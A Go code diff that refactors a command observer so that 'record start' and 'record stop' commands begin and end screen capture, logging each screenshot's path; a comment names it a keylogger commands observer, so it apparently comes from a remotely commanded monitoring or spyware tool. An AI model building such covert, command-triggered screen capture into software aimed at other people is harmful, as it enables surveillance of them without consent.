@@ -7,7 +7,8 @@ import (
 
 // KeyLogger commands Observer
 type ScreenshotCmdObserver struct {
-	recorder *screen.ScreenRecorder
+	recorder         *screen.ScreenRecorder
+	recordingChannel chan *screen.Screenshot
 }
 
 func (o *ScreenshotCmdObserver) execute(cmd string, data []string) {
@@ -15,25 +16,45 @@ func (o *ScreenshotCmdObserver) execute(cmd string, data []string) {
 		return
 	}
 
+	log.Println("ScreenshotCmdObserver: new action triggered")
+
 	// This commands needs data to operate
 	if len(data) <= 0 {
 		return
 	}
 
 	if data[0] == "record" {
-		go func() {
-			ch := make(chan *screen.Screenshot)
+		if len(data) <= 1 {
+			return
+		}
 
-			o.recorder.StartCapturing(ch)
+		if data[1] == "start" {
+			o.startRecording()
+			return
+		} else if data[1] == "stop" {
+			o.stopRecording()
+			return
+		}
 
-			for {
-				shot := <-ch
-				log.Printf("SHOT (%s)%s - %s \n", shot.FileGroup, shot.FileName, shot.FilePath)
-			}
-		}()
+		return
 	}
+}
 
-	log.Println("ScreenshotCmdObserver: new action triggered")
+func (o *ScreenshotCmdObserver) startRecording() {
+	o.recordingChannel = make(chan *screen.Screenshot)
+
+	go func() {
+		o.recorder.StartCapturing(o.recordingChannel)
+
+		for {
+			shot := <-o.recordingChannel
+			log.Printf("SHOT (%s)%s - %s \n", shot.FileGroup, shot.FileName, shot.FilePath)
+		}
+	}()
+}
+
+func (o *ScreenshotCmdObserver) stopRecording() {
+	o.recorder.StopCapturing()
 }
 
 func NewScreenshotCmdObserver(recorder *screen.ScreenRecorder) *ScreenshotCmdObserver {
